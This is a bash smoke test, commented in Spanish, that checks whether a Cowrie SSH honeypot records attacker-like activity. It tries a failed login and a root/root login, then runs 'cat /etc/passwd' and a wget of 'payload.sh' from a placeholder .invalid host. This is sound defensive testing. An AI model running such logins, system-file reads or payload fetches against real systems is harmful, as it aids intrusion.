#!/usr/bin/env bash
# tests/smoke_ssh.sh — prueba de humo de Cowrie (módulo A)
# Requisitos: ssh, sshpass, jq, docker (para leer el volumen honeylogs).
#   sudo apt install openssh-client sshpass jq
# Uso: ./tests/smoke_ssh.sh        (variables: HOST, PORT, WAIT_SECS, ...)
set -euo pipefail

HOST="${HOST:-127.0.0.1}"
PORT="${PORT:-2222}"
USER_OK="${USER_OK:-root}"
PASS_OK="${PASS_OK:-root}"                       # debe existir en cowrie/userdb.txt
USER_BAD="${USER_BAD:-smoketest}"
PASS_BAD="${PASS_BAD:-contrasena-incorrecta-smoke}"
WGET_URL="${WGET_URL:-http://smoke-test.invalid/payload.sh}"   # .invalid (RFC 2606): nunca resuelve
BUSYBOX_IMAGE="${BUSYBOX_IMAGE:-busybox:1.36}"
LOG_PATH="/logs/cowrie/cowrie.json"
WAIT_SECS="${WAIT_SECS:-30}"

fail() { echo "FAIL: $*" >&2; exit 1; }
pass() { echo "  ok  - $*"; }

for bin in ssh sshpass jq docker; do
  command -v "$bin" >/dev/null 2>&1 || fail "falta '$bin'"
done

# Lee cowrie.json de honeylogs-cowrie (la imagen de Cowrie no trae shell)
read_log() {
  docker run --rm -v honeylogs-cowrie:/logs/cowrie:ro "$BUSYBOX_IMAGE" cat "$LOG_PATH" 2>/dev/null || true
}

# has_event <eventid> [campo] [regex]  -> exit 0 si hay algún evento que cumpla
has_event() {
  local id="$1" field="${2:-}" re="${3:-}"
  jq -Rn -e --arg id "$id" --arg f "$field" --arg re "$re" '
    [inputs | fromjson? | select(type=="object" and .eventid==$id)
     | select($f=="" or ((.[$f] // "" | tostring) | test($re)))] | length > 0
  ' "$TMP" >/dev/null
}

TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT

SSH_OPTS=(-p "$PORT"
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR
  -o PreferredAuthentications=password -o PubkeyAuthentication=no
  -o ConnectTimeout=10)

BEFORE="$(read_log | wc -l)"
echo "[1/4] Líneas previas en cowrie.json: $BEFORE"

echo "[2/4] Generando tráfico contra ${HOST}:${PORT}"
# 2a) Login fallido
SSHPASS="$PASS_BAD" sshpass -e ssh "${SSH_OPTS[@]}" "${USER_BAD}@${HOST}" true >/dev/null 2>&1 || true
# 2b) Login correcto + comandos en sesión interactiva
{
  sleep 2
  for c in "uname -a" "cat /etc/passwd" "wget ${WGET_URL}"; do
    echo "$c"
    sleep 3
  done
  echo "exit"
  sleep 1
} | SSHPASS="$PASS_OK" sshpass -e ssh -tt "${SSH_OPTS[@]}" "${USER_OK}@${HOST}" >/dev/null 2>&1 || true

echo "[3/4] Esperando eventos en cowrie.json (máx ${WAIT_SECS}s)"
deadline=$((SECONDS + WAIT_SECS))
SID=""
while (( SECONDS < deadline )); do
  read_log | tail -n +"$((BEFORE + 1))" > "$TMP"
  SID="$(jq -Rn -r '[inputs | fromjson? | select(type=="object" and .eventid=="cowrie.login.success")]
                    | last | .session // empty' "$TMP")"
  if [[ -n "$SID" ]] && jq -Rn -e --arg s "$SID" \
       '[inputs | fromjson? | select(type=="object" and .eventid=="cowrie.session.closed" and .session==$s)]
        | length > 0' "$TMP" >/dev/null; then
    break
  fi
  sleep 2
done

echo "[4/4] Comprobando eventos"
[[ -s "$TMP" ]]                                   || fail "no hay eventos nuevos en cowrie.json"
has_event cowrie.session.connect                  || fail "falta cowrie.session.connect"
pass "cowrie.session.connect"
has_event cowrie.login.failed username "^${USER_BAD}$" || fail "falta cowrie.login.failed (${USER_BAD})"
pass "cowrie.login.failed"
has_event cowrie.login.success username "^${USER_OK}$" || fail "falta cowrie.login.success (${USER_OK})"
pass "cowrie.login.success"
has_event cowrie.command.input input '^uname -a$'      || fail "falta command.input 'uname -a'"
pass "cowrie.command.input: uname -a"
has_event cowrie.command.input input '^cat /etc/passwd$' || fail "falta command.input 'cat /etc/passwd'"
pass "cowrie.command.input: cat /etc/passwd"
has_event cowrie.command.input input '^wget .*smoke-test\.invalid' || fail "falta command.input wget"
pass "cowrie.command.input: wget (URL registrada)"
[[ -n "$SID" ]] && jq -Rn -e --arg s "$SID" \
  '[inputs | fromjson? | select(type=="object" and .eventid=="cowrie.session.closed" and .session==$s)]
   | length > 0' "$TMP" >/dev/null                 || fail "falta cowrie.session.closed de la sesión $SID"
pass "cowrie.session.closed (sesión $SID)"
has_event cowrie.session.connect timestamp 'Z$'    || fail "timestamps no están en UTC (sufijo Z)"
pass "timestamps UTC"

echo "OK"
